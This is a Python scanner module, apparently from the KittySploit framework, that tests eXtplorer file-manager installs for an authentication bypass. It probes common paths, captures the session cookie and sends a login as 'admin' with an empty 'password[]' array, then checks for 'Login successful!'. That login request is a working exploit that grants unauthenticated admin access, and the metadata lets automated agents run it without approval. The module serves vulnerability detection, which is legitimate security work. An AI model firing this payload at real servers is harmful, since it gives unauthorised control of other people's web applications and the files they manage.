#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""eXtplorer password[] authentication bypass."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'eXtplorer - password[] Auth Bypass Detection',
        'description': (
            'Detects eXtplorer auth bypass via password[]= empty array login as admin.'
        ),
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': [
            'web', 'scanner', 'extplorer', 'auth-bypass', 'unauth', 'vuln',
        ],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 4,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0, 'min_params': 0,
                'tech_hints_any': [], 'tech_hints_all': [],
                'specializations_any': [], 'risk_signals_any': [],
                'auth_session': False, 'capabilities_any': [], 'capabilities_all': [],
                'confidence_min': {}, 'confidence_min_any': {},
                'endpoint_pattern_any': [], 'param_any': [], 'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [{'capability': 'admin_surface', 'from_detail': ''}],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://www.exploit-db.com/exploits/23236',
        ],
    }

    def run(self):
        for base in ('', '/extplorer', '/eXtplorer', '/filemanager'):
            path = f'{base}/index.php'
            r0 = self.http_request(method='GET', path=path, allow_redirects=False)
            if not r0 or 'eXtplorer' not in (r0.text or ''):
                continue
            cookie = None
            for k, v in r0.headers.items():
                if k.lower() == 'set-cookie' and 'eXtplorer=' in v:
                    cookie = v.split(';')[0].strip()
                    break
            if not cookie:
                continue
            data = 'option=com_extplorer&action=login&type=extplorer&username=admin&password[]='
            r = self.http_request(
                method='POST',
                path=path,
                data=data,
                headers={
                    'Cookie': cookie,
                    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                    'X-Requested-With': 'XMLHttpRequest',
                },
                allow_redirects=False,
            )
            if r and 'Login successful!' in (r.text or ''):
                self.set_info(
                    severity='critical',
                    reason='eXtplorer password[] auth bypass',
                    path=path,
                )
                return True
        return False
